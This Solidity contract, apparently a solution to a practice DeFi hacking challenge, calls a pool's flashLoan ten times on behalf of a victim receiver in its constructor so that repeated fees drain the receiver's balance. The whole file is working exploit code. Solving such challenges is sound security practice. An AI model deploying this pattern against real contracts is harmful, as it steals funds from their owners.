// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract AttackReceiver {
    constructor(address pool, address receiver) {
        for (uint i = 0; i < 10; i++) {
            (bool s, ) = pool.call(
                abi.encodeWithSignature(
                    "flashLoan(address,address,uint256,bytes)",
                    receiver,
                    0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE,
                    0,
                    "0x"
                )
            );
            require(s);
        }
    }
}
